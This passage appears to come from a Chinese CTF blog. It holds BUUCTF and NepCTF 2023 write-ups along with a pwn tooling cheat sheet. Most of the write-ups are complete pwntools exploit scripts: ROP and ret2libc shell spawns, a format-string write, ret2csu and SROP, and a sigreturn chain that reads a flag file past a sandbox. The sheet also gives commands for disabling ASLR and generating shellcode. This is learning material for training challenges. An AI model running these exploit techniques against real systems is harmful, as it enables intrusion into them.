b&#x27;a&#x27;*(0x2c+4)+p32(system)+b&#x27;aaaa&#x27;+p32(binsh)p.recvuntil(b&quot;How many bytes do you want me to read?&quot;)p.sendline(b&#x27;-1&#x27;)p.recvuntil(b&quot;\\n&quot;)p.sendline(pay2)p.interactive() bjdctf_2020_babyrop0x01注意这题位64位。32位和64位传参有区别 思路： 利用puts函数泄露出puts函数真实地址 通过puts函数地址计算出libc基地址，从而计算出system和binsh的真实地址 构造rop链栈溢出getshell puts函数通过pop rdi ; ret 传参 用ROPgadget可以找到 0x02exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445#encoding = utf-8 from pwn import * from LibcSearcher import * context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)content = 1elf = ELF(&#x27;./pwn&#x27;) def main(): if content == 1: p = process(&#x27;./pwn&#x27;) else: p = remote(&#x27;node4.buuoj.cn&#x27;,29917) #elf main_addr = elf.sym[&#x27;main&#x27;] plt_addr = elf.plt[&#x27;puts&#x27;] got_addr = elf.got[&#x27;puts&#x27;] pop_rdi = 0x0400733 ret_addr = 0x04004c9 payload = b&#x27;a&#x27;*(0x20+0x8) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr) p.recvuntil(&quot;Pull up your sword and tell me u story!\\n&quot;) p.sendline(payload) puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) print(hex(puts_addr)) #libc lib = LibcSearcher(&#x27;puts&#x27;,puts_addr) lib_puts_addr = lib.dump(&#x27;puts&#x27;) lib_system_addr = lib.dump(&#x27;system&#x27;) lib_bin_addr = lib.dump(&#x27;str_bin_sh&#x27;) #base base_addr = puts_addr - lib_puts_addr system_addr = base_addr + lib_system_addr bin_addr = base_addr + lib_bin_addr payload = b&#x27;a&#x27;*(0x20+0x8) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr) p.recvuntil(&quot;Pull up your sword and tell me u story!\\n&quot;) p.sendline(payload) p.interactive()main() [HarekazeCTF2019]baby_rop264位的ret2libc3 0x01 利用printf泄露libc版本和基地址，传参的时候需要传入格式化字符串%s给寄存器rdi（程序中第二个printf函数自带，返回至该格式化字符串地址即可）；并将想要泄露的read_got传给寄存器。 0x02exp 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from LibcSearcher import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,25502)#p = process(&#x27;./babyrop2&#x27;)elf = ELF(&#x27;./babyrop2&#x27;)libc = ELF(&#x27;libc.so.6&#x27;)#一定要用题目给的libc文件，可能必须要用题目给的才能打通printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = elf.sym[&#x27;main&#x27;]pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731fmt = 0x0000000000400790payload1 = b&#x27;a&#x27;*(0x20+8)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_plt)p.recvuntil(&quot;name? &quot;)p.sendline(payload1)read_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(&quot;read_addr ======&gt;&gt; &quot;+hex(read_addr))libc_base = read_addr - libc.sym[&quot;read&quot;]system_addr = libc_base+libc.sym[&quot;system&quot;]bin_sh_addr=libc_base+libc.search(b&#x27;/bin/sh&#x27;).__next__()payload2 = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(0)p.sendline(payload2)p.interactive() jarvisoj_fmBUUCTF pwn考点：格式化字符串漏洞 格式化字符串，任意地址写漏洞 将x写为4即可getshell，x的地址为0x0804a02c，调试可得输入的内容位于栈偏移11个单位处 exp 1234567891011121314from pwn import * context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;) #p = process(&#x27;./pwn&#x27;)p=remote(&#x27;node4.buuoj.cn&#x27;,29551)x_addr=0x804A02Cpayload=p32(x_addr)+b&quot;%11$n&quot;p.sendline(payload)p.interactive() 或更通用 1234567891011121314151617#!/usr/bin/env python2#-*- coding=UTF-8 -*-from pwn import *context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./jarvisoj_fm&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26325)#gdb.attach(sh)x_addr = 0x0804a02c#将栈偏移13个单位处的x_addr指针指向的地址内容修改为4#payload中x_addr写入的位置为栈偏移13处，见下图#25346225(小端)是栈偏移11，所以2ca00408(小端)是栈偏移11+2=13payload = &#x27;%4c%13$n&#x27; + p32(x_addr)#pause()sh.sendline(payload)sh.sendline(&#x27;cat flag&#x27;)sh.interactive() ciscn_2019_s_30x0164位开启NX 注意程序直接使用sys_read和sys_write函数而不是通常的read和write，在构造payload时要注意在函数返回时没有pop rbp这一步而是直接执行ret，所以我们直接覆盖rbp为vuln函数地址。 0x02本题两种做法，一种是ret2csu，利用__libc_csu_init布置栈空间；一种是SROP 题目也给出了相应的gadgets，若选择rax传参0xF（系统调用号），则可执行sigreturn系统调用；若选择rax传参0x3B，则可执行excve(‘&#x2F;bin&#x2F;sh’,0,0)系统调用 我们需要在栈上布置ROPgadgets和各参数，而栈地址是随机的，所以我们首先要泄露栈地址。 同时我们知道栈上的各地址间的相对位置是不变的，所以泄露出栈地址后可以通过与buf的偏移计算出buf的地址 经过调试发现，如图： buf的起始地址为0x7fffffffded0，目标泄露栈地址（即某个rbp的值）为图中栈偏移为02的地址0x7fffffffe018，二者相差0x148。这是本地的偏移，若要获得与远程环境相同的偏移要应用patchelf。具体可看这篇文章。用相同的方法调试可得远程偏移为0x118. 在接收泄露的栈地址之前需要去掉多余的buf(0x10)+rbp(vul_addr)+栈上偏移为01的地址。 exp第一部分 123456789101112vul_addr = 0x4004edret_addr = 0x4003a9vul_addr = 0x4004edpayload = b&#x27;a&#x27; * 0x10 + p64(vul_addr)p.send(payload)p.recv(0x20)stack_addr = u64(p.recv(8))print(hex(stack_addr))#buf_addr = stack_addr-0x118buf_addr = stack_addr-0x148 0x03第一种做法：ret2csu控制执行execve__libc_csu_init （具体可以看ctf-wiki中的介绍） 需要将各寄存器置为： rax 0x3B rdi &#x3D; ‘&#x2F;bin&#x2F;sh’ rsi &#x3D; 0 rdx &#x3D; 0 ROPgadget 能找到控制rdi和rsi的，以及syscall （不过实际上没有用rsi的，因为csu中有pop r14和mov rsi, r14指令，可以通过栈上布置将rsi置为0） 现在还要想办法控制rdx 通过__libc_csu_init可以看到，我们可以先执行pop r13然后再执行mov rdx, r13将rdx置为0 同时还要注意： 0x400589: call [r12 + rbx * 8], 会执行r12+rbx8地址指向的函数，不过这里没有需要执行的函数，所以可以在buf里放了个ret;的地址…, 然后让r12 + rbx8指向buf；call函数之前会自动将下一条指令入栈，接着执行ret则rsp指针相当于不变 cmp rbx, rbp; jnz short loc_400580, 如果rbx和rbp相同会循环。想要绕过需要使 rbx &#x3D; 0 rbp &#x3D; 1 泄露函数地址后直接重进的vul函数，buf的地址不变 1234567891011121314151617pop_rdi = 0x4005a3syscall = 0x400501vul_addr = 0x4004edret_addr = 0x4003a9payload = p64(ret_addr) + b&#x27;/bin/sh\\0&#x27;#为之后函数跳转和传入binsh做准备payload += p64(0x4004e2) # rax=0x3bpayload += p64(0x40059a) # 6个poppayload += p64(0) + p64(1) # rbx = 0, rbp = 1payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addr，r13 r14 r15 = 0payload += p64(0x400580) #执行寄存器r12指向的函数 （也就是ret）；把rdx设为0 payload += p64(0) * 7 # 这里执行到0x400596后又会重新pop一遍, 开头执行add rsp, 8让rsp跳过了栈上的一个数据，如何执行6pop，所以栈上布置7个0payload += p64(pop_rdi) + p64(buf_addr + 8) # rdi = &amp;&#x27;/bin/sh\\0&#x27;payload += p64(syscall)payload += p64(vul_addr)p.send(payload)p.interactive() 第二种：SROP具体可参考ctf-wiki 本题解法可参考这篇博客 12345678sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = buf_addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rip = syscallpayload = b&#x27;/bin/sh\\0&#x27;.ljust(0x10, b&#x27;a&#x27;) + p64(0x4004da) + p64(syscall) + bytes(sigframe) 利用pwntools的sigframe模块即可 其实这两种解法都是以程序读入足够多的字节为条件的 完整exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;] p = process(&#x27;./ciscn_s_3&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,29591)pop_rdi_ret = 0x4005a3syscall = 0x400501vul_addr = 0x4004edret_addr = 0x4003a9vul_addr = 0x4004edpayload = b&#x27;a&#x27; * 0x10 + p64(vul_addr)p.send(payload)p.recv(0x20)stack_addr = u64(p.recv(8))print(hex(stack_addr))#buf_addr = stack_addr-0x118buf_addr = stack_addr-0x148gdb.attach(p)payload = p64(ret_addr) + b&#x27;/bin/sh\\00&#x27;payload += p64(0x4004e2) # rax=0x3bpayload += p64(0x40059a) # rdx = 0payload += p64(0) + p64(1) # rbx = 0, rbp = 1payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addrpayload += p64(0x400580)payload += p64(0) * 7payload += p64(pop_rdi_ret) + p64(buf_addr + 8) # rdi = &amp;&#x27;/bin/sh\\0&#x27;payload += p64(syscall)#payload += p64(vul_addr)&#x27;&#x27;&#x27;sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = buf_addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rip = syscallpayload = b&#x27;/bin/sh\\0&#x27;.ljust(0x10, b&#x27;a&#x27;) + p64(0x4004da) + p64(syscall) + bytes(sigframe)&#x27;&#x27;&#x27;p.send(payload)p.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.com/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"PWN一些用到的指令和工具","slug":"PWN一些用到的指令和工具","date":"2023-08-28T13:54:45.000Z","updated":"2024-01-31T02:56:01.328Z","comments":true,"path":"posts/6121198a/","link":"","permalink":"http://lmarch2.github.com/posts/6121198a/","excerpt":"ROPgadget ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段 ROPgadget –binary 文件名 –sting ‘&#x2F;bin&#x2F;sh’ vmmap vim pwndbg ASLR和pie编译 shellcode GCC编译指令 关于符号表 patchelf","text":"ROPgadget ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段 ROPgadget –binary 文件名 –sting ‘&#x2F;bin&#x2F;sh’ vmmap vim pwndbg ASLR和pie编译 shellcode GCC编译指令 关于符号表 patchelf ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段查找汇编指令的地址 例子： ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep eax ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep ‘: mov eax’ –only ” | “ 表示只返回含有xx指令或xx指令的gadget grep 表示含有什么什么特定字段（通常是寄存器）的指令 但是grep能寻找的必须是连续的指令中间不能隔开，连空格都必须一致才能被搜索到 比如你想要搜索0x080701a8 : mov eax, ecx ; ret，你可以用命令ROPgadget --binary get_started_3dsctf_2016 --only &quot;mov|ret&quot; |grep &#39;eax, ecx&#39;；命令ROPgadget --binary get_started_3dsctf_2016 --only &quot;mov|ret&quot; |grep &#39;eax,ecx&#39;无法成功因为逗号和ecx之间少了一个空格 取地址的指令[edx]无法被识别，[ ]在ROPgadget中貌似是表示含有[ ]内字母的指令 比如 ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep ‘[edx]’得到的是这样 ROPgadget –binary 文件名 –sting ‘&#x2F;bin&#x2F;sh’查找字符串地址 例子： ROPgadget –binary 文件名 –sting ‘&#x2F;bin&#x2F;sh’ ROPgadget –binary 文件名 –sting ‘&#x2F;sh’ ROPgadget –binary 文件名 –sting ‘sh’ ROPgadget –binary 文件名 –sting ‘cat flag’ ROPgadget –binary 文件名 –sting ‘cat flag.txt’ ![( vmmap1vmmap [-h] [pages_filter] 首先vmmap需要在pwndbg，且程序运行时使用 输入vmmap，显示出程序运行时所用到的所有地址段 输入vmmap 地址 ，显示该地址对应的地址段 vmmap -h，提示帮助；-w只显示可写的部分；-x只显示可执行的部分 例子： 第一行，表明了哪个颜色对应哪个段， start和end对应该地址段的起始和结束位置 Perm 是该段的权限，rwx代表可读、可写、可执行 Size表示该段大小 Offset表示这段与程序基址的偏移 File表示加载的是什么 vim命令模式下： $ 行末 ^ 行首 L 屏幕底行 H 屏幕顶行 yy 拷贝该行 dd 删除该行 P 前粘贴 p 后粘贴 D 删除至行尾 u 撤销 gg 光标移至行首 dG 删除光标行及光标行以下全部内容 底线命令模式下： :wq 保存并退出 :%d 删除全部内容 :%s 替换 参考（万里哥我滴神） pwndbg基本指令 r &#x3D; run 运行程序，如果你当前已经在运行程序了，再输入r会重新运行程序 b &#x3D; break 下断点，在调试pwn中，一般是 b 0xabcde ，abcde是在ida中看到的地址,如b 0x400908 c &#x3D; continue 继续运行程序直到停在下一个断点 n &#x3D; next 下一行，一般装了pwndbg之后下一行指的是下一条汇编，但是如果调试的程序是带调试信息的，一般会跳几行汇编 ni &#x3D; nexti 下一条指令，这个就是真正的下一条汇编指令 s &#x3D; step 单步进入函数 d &#x3D; delete 删除断点，后面可带数字，说明删除第几个断点，如果不带参数，说明删除全部断点 x 查看内存 c,n,ni这几个程序都可以带一个数字，用来代表连续运行这个指令多少次 x&#x2F;num xg 地址 64位查看某处地址 x&#x2F;num xw 地址 32位查看某处地址 s&#x2F;num s 地址 查看从地址开始的num个字符串 b *$rebase(地址) 用于开启PIE该指令会在基址+地址处下断点 https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html100个gdb小技巧 gdb制定程序运行的参数gdb –args binary value gdb调试改变地址或地址指向值set addr_old &#x3D; addrset *addr_old &#x3D; addr bt显示函数所有调用栈的信息bt n显示栈顶的n个调用信息bt -n显示栈底的n个调用信息 中间加full表示 显示栈中所有帧的完全信息如：函数参数，本地变量 ASLR和pie编译查看系统当前ASLR打开情况 sudo cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space ASLR的三个级别 ： 0， 不开启任何随机化； 1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化； 2，开启heap随机化。 PIE编译出来的executable如果ASLR&#x3D;0的话，基址也是不会变的（有能力但没使用），如果ASLR&#x3D;1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了 指令关闭ASLR sysctl -w kernel.randomize_va_space&#x3D;0 echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。 gcc helloworld.c file a.out a.out: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.9, not stripped file a.out a.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.9, not stripped 未开启PIE的文件属性为executable，开启的为shared object 注意PIE随机程序加载基地址，要和libc的随机libc库基地址区分 shellcodepwntools生成的shellcode默认64位 shellcode &#x3D; asm(shellcraft.sh()) 要生成32位的shellcode需要指定 shellcode &#x3D; asm(shellcraft.sh(),arch&#x3D;’i386’,os&#x3D;’linux’) 手动反汇编汇编指令 xx &#x3D; asm(‘’’ ‘’’) GCC编译指令gcc各保护编译指令https://blog.csdn.net/tabactivity/article/details/126660974https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/全开 gcc test.c -o test -z noexecstack -z now -fstack-protector -fpie -pie 全关 gcc test.c -o test -z execstack -z norelro -fno-stack-protector -no-pie sudo sh -c “echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space”关闭ASLR把0换成2就是开启 编译时加上 -m32 即编译成32位程序 https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358 关于符号表12readelf binary -p .comment或 objdump -s --section=.comment binary 可以查看程序或编译器版本 readelf，objdump，去符号表，恢复符号表上链接readelfobjdump去符号表恢复符号表 patchelfpatchef四部曲 ldd binary列出动态库依赖 strings 题目给的libc名 | grep ubuntu快速找到Libc文件对应版本 （cp 想替换的文件到赛题目录） patchelf –set-interpreter .&#x2F;ld-2.27.so .&#x2F;binary—————————对应的ld文件—-pwn文件 patchelf –replace-needed libc.so.6 .&#x2F;libc-2.27.so .&#x2F;binary————————-原本的libc—-要替换的libc—–pwn文件 （若只用上述命令碰到如下报错时）patchelf –replace-needed libpthread.so.0 .&#x2F;libpthread-2.31.so .&#x2F;binary ——————————–原本的 ——— 要替换的 Linux命令 pwd ：获取当前所在目录路径realpath file : 获取文件地址 pip list查看已安装包pip show 包名 查看包安装路径","categories":[{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.com/categories/tools-and-tricks/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"2023NepCTF WP","slug":"2023NepCTF-WP","date":"2023-08-15T03:25:59.095Z","updated":"2024-01-31T02:26:04.610Z","comments":true,"path":"posts/0/","link":"","permalink":"http://lmarch2.github.com/posts/0/","excerpt":"NepCTF2023 WP真的超级紧张刺激的比赛！！有做不出题目夜不能寐的痛苦，也有冥思苦想之后的豁然开朗，第一次感受到了ctf比赛的乐趣所在。虽然最后的成绩停留在110，不过对于一个初出茅庐的萌新，已经很满足了；即使比赛结束后才做出三月七和最后放出的两个pwn题（挺气的，早知道不看万恶的login的……）。那就给自己继续加油吧，希望下次比赛能拿到属于自己的一份荣誉！","text":"NepCTF2023 WP真的超级紧张刺激的比赛！！有做不出题目夜不能寐的痛苦，也有冥思苦想之后的豁然开朗，第一次感受到了ctf比赛的乐趣所在。虽然最后的成绩停留在110，不过对于一个初出茅庐的萌新，已经很满足了；即使比赛结束后才做出三月七和最后放出的两个pwn题（挺气的，早知道不看万恶的login的……）。那就给自己继续加油吧，希望下次比赛能拿到属于自己的一份荣誉！ PWNsrop使用经典srop技巧，但是在此基础上又加了orz，观察程序会发现，能够调用sigreturn（调用号为0xf），而且溢出量足够大（0x300）。整体的一个思路就是构造system call chains，伪造四个栈帧，在syscall返回的时候，rsp会返回到另一个sigframe，从而实现一个又一个的函数调用。 几个注意点： 利用pwntools写frame的时候对各个寄存器传入的都是地址，不能直接把字符串写进去（会bytes()报错 别问为什么我知道） 返回执行系统syscall的时候注意这个程序只有call _system，而没有直接的syscall汇编指令，而进入到call _system单步调试可以发现这个过程中各个寄存器的值是会发生变化的（不同的寄存器之间赋值），所以我们在构造frame指定寄存器值的时候需要根据call _system中的指令来调整frame的各个寄存器值，sigreturn也是如此，有其他的命令会改变rax的值，因此需要多一个pop rdi控制一下 各个stack_frame需要精心构造 因为沙箱禁掉了execve，所以我们使用open,read,write绕过沙箱。（一定注意这里读取文件内容的read系统调用rdi传参是3） exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#p = process(&quot;./pwn&quot;)p = remote(&#x27;nepctf.1cepeak.cn&#x27;,31552)#gdb.attach(p)#syscall = 0x400788syscall = 0x04005B0pop_rdi = 0x0000000000400813sigreturn = p64(pop_rdi)+p64(0xf)+p64(0x400750)+p64(syscall)buf = 0x0601020 # buf地址#writeframe4 = SigreturnFrame(kernel=&#x27;amd64&#x27;)frame4.rdi = constants.SYS_write#raxframe4.rcx = 0x40#rdxframe4.rsi = 1#rdiframe4.rdx = buf#rsiframe4.rip = syscallframe4.rsp = buf#+len(sigreturn+bytes(sigframe)) # 设置栈顶指针位置stack3 = sigreturn+bytes(frame4)#openframe2 = SigreturnFrame(kernel=&#x27;amd64&#x27;)frame2.rdi = constants.SYS_open#raxframe2.rcx = 0#rdxframe2.rsi = buf#rdi注意这里是不能直接传字符串&quot;flag&quot;的，而是应该传地址frame2.rip = syscallframe2.rsp = buf+5+len(sigreturn+bytes(frame2)) # 设置栈顶指针位置stack1 = sigreturn+bytes(frame2)#read2frame3 = SigreturnFrame(kernel=&#x27;amd64&#x27;)frame3.rdi = constants.SYS_read#raxframe3.rcx = 0x40#rdxframe3.rsi = 3#rdiframe3.rdx = buf#rsiframe3.rip = syscallframe3.rsp = buf+5+len(stack1+sigreturn+bytes(frame3)) # 设置栈顶指针位置stack2 = sigreturn+bytes(frame3)stack_frame = b&quot;flag\\x00&quot;+stack1+stack2+stack3#stack_frame = sigreturn+bytes(sigframe)+sigreturn+bytes(sframe)#read1frame = SigreturnFrame(kernel=&#x27;amd64&#x27;)frame.rdi = constants.SYS_read#raxframe.rcx = len(stack_frame)#rdxframe.rsi = 0#rdiframe.rdx = buf#rsiframe.rip = syscallframe.rsp = buf+5 # 设置栈顶指针位置print(bytes(frame))pad = cyclic(0x38)pad += sigreturn + bytes(frame)p.recv()p.send(pad)#pause(1)#gdb.attach(p)p.send(stack_frame)p.interactive() 可恶的Login找不出路径…… HRP-CHAT-2真的服了….真的就差一步，下标没弄清楚，其实一个个试都可以试出来的…. 获得攻击力最高的角色（需要抽卡得到，抽卡的次数会影响你的下标） 选择攻击力最强的技能，击败boss即可拿到flag HRP-CHAT-3阅读源码 main函数里执行子进程，崩溃进入CMD CMD函数 可以想到让子进程崩溃后，进入安全模式拿flag 1234567891011121314151617181920212223242526272829from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#p = process(&quot;./&quot;)p = remote(&#x27;nepctf.1cepeak.cn&#x27;,31971)sda = lambda delim,data :p.sendafter(delim,data)sd = lambda data :p.send(data)sea = lambda delim,data :p.sendafter(delim,data)sl = lambda data :p.sendline(data)sla = lambda delim,data :p.sendlineafter(delim,data)ru = lambda delims,drop=True :p.recvuntil(delims,drop)uu32 = lambda data :u32(data.ljust(4,b&#x27;\\x00&#x27;))uu64 = lambda data :u64(data.ljust(8,b&#x27;\\x00&#x27;))lg = lambda name,addr :log.success(name+&#x27;=&#x27;+hex(addr))ia = lambda :p.interactive()def get_addr64() : return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_addr32() : return u32(p.recvuntil(b&#x27;\\xf7&#x27;)[-4:])ru(b&#x27;help&#x27;)sl(b&#x27;Login\\n&#x27;)sla(&#x27;6&#x27;,b&#x27;Login\\n&#x27;*0x517)sl(b&#x27;\\nSafe_Mode_Key&#x27;)ia() MISCcheckin一个号只能发一次，第一次发错了….（哭） NepCTF{H4ve_Fun_1N_This_Game} 与AI共舞的哈夫曼年轻人就要年轻，正经人谁自己做题啊~x GPT秒了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115import heapqimport osclass HuffmanNode: def __init__(self, char, freq): self.char = char self.freq = freq self.left = None self.right = None def __lt__(self, other): return self.freq &lt; other.freqdef build_huffman_tree(frequencies): heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()] heapq.heapify(heap) while len(heap) &gt; 1: left = heapq.heappop(heap) right = heapq.heappop(heap) merged = HuffmanNode(None, left.freq + right.freq) merged.left = left merged.right = right heapq.heappush(heap, merged) return heap[0]def build_huffman_codes(node, current_code, huffman_codes): if node is None: return if node.char is not None: huffman_codes[node.char] = current_code return build_huffman_codes(node.left, current_code + &#x27;0&#x27;, huffman_codes) build_huffman_codes(node.right, current_code + &#x27;1&#x27;, huffman_codes)def compress(input_file, output_file): with open(input_file, &#x27;rb&#x27;) as f: data = f.read() frequencies = &#123;&#125; for byte in data: if byte not in frequencies: frequencies[byte] = 0 frequencies[byte] += 1 root = build_huffman_tree(frequencies) huffman_codes = &#123;&#125; build_huffman_codes(root, &#x27;&#x27;, huffman_codes) compressed_data = &#x27;&#x27; for byte in data: compressed_data += huffman_codes[byte] padding = 8 - len(compressed_data) % 8 compressed_data += &#x27;0&#x27; * padding with open(output_file, &#x27;wb&#x27;) as f: # Write frequency information f.write(bytes([len(frequencies)])) for byte, freq in frequencies.items(): f.write(bytes([byte, (freq &gt;&gt; 24) &amp; 0xFF, (freq &gt;&gt; 16) &amp; 0xFF, (freq &gt;&gt; 8) &amp; 0xFF, freq &amp; 0xFF])) # Write compressed data for i in range(0, len(compressed_data), 8): byte = compressed_data[i:i+8] f.write(bytes([int(byte, 2)]))def decompress(compressed_file, decompressed_file): with open(compressed_file, &#x27;rb&#x27;) as f: # 读取频率信息 num_symbols = int.from_bytes(f.read(1), byteorder=&#x27;big&#x27;) frequencies = &#123;&#125; for _ in range(num_symbols): byte, freq1, freq2, freq3, freq4 = f.read(5) freq = (freq1 &lt;&lt; 24) | (freq2 &lt;&lt; 16) | (freq3 &lt;&lt; 8) | freq4 frequencies[byte] = freq # 构建哈夫曼树 root = build_huffman_tree(frequencies) # 解压缩数据 current_node = root decompressed_data = bytearray() while True: bit = f.read(1) if not bit: break bit = int.from_bytes(bit, byteorder=&#x27;big&#x27;) for i in range(7, -1, -1): if current_node.char is not None: decompressed_data.append(current_node.char) current_node = root if (bit &gt;&gt; i) &amp; 1 == 1: current_node = current_node.right else: current_node = current_node.left # 写入解压缩后的数据 with open(decompressed_file, &#x27;wb&#x27;) as output_f: output_f.write(decompressed_data)if __name__ == &quot;__main__&quot;: input_file = &#x27;input.txt&#x27; compressed_file = &#x27;compressed.bin&#x27; decompressed_file = &#x27;decompressed.txt&#x27; # 解压缩文件 decompress(compressed_file, decompressed_file) codes各种尝试想要提权结果没一个函数有用的，system,getenv,mprotect甚至read甚至env本身全都禁掉了 只好直接输出，想到函数参数依次入栈，而env环境变量也是main函数的一个参数，从而想到在argc的基础上++移动指针，暴力输出大量数据，从中找到flag 1234567891011#include &lt;stdio.h&gt;int main( int argc, char *argv[])&#123; for （int i = 0; i&lt; argc; ++i) &#123; for(int j = 0;j&lt;700;++j) printf(&quot;%d&#x27;: %s n&quot;, i, argv［ i 」 + j ); &#125;return 0;&#125; （优雅） 小叮弹钢琴mid音频隐写（我思考velato这样的音符编程语言尝试了好久最后发现就是个隐写？？） 前半段是短音符和长音符，判断是摩斯电码，后面的是一串十六进制数字 摩斯电码解码得到tip：youshouldusethistoxorsomething 真，一开始断句成了this tox or something （甚至找了半天tox是啥） 接下来异或卡了好久，愣是没想到是用这句话去异或 之后联想前几个字母是NepCTF，尝试发现与之异或的是you，才发现把youshouldusethistoxorsomething这句话去异或0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17就行了 陌生的语言由给出的hint可知是小魔女学园的月文和龙语。 纯粹的信息收集了 NepCTF{NEPNEP_A_BELIEVING_Heart_is_your_magic} ConnectedFive真的是下棋下出来的 你也喜欢三月七么题目所给附件 12345salt_lenth= 10 key_lenth= 16 iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc 看上去是AES，根据题目： salt&#x3D;NepCTF2023 salt用sha256加密后得到key，解得sha256（salt）&#x3D; dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009 截取前十六位为key 123456789101112131415from Crypto.Cipher import AESkey = &#x27;dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009&#x27;iv_hex = &#x27;88219bdee9c396eca3c637c0ea436058&#x27; #原始iv转hex的值ciphertext= &#x27;&#x27;&#x27;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&#x27;&#x27;&#x27;# 把hex值转成bytesiv = bytes.fromhex(iv_hex)key = bytes.fromhex(key)[:16]ciphertext = bytes.fromhex(ciphertext)aes = AES.new(key, AES.MODE_CBC, iv)plaintext = aes.decrypt(ciphertext)print(&#x27;plaintext:&#x27;, plaintext)# plaintext: 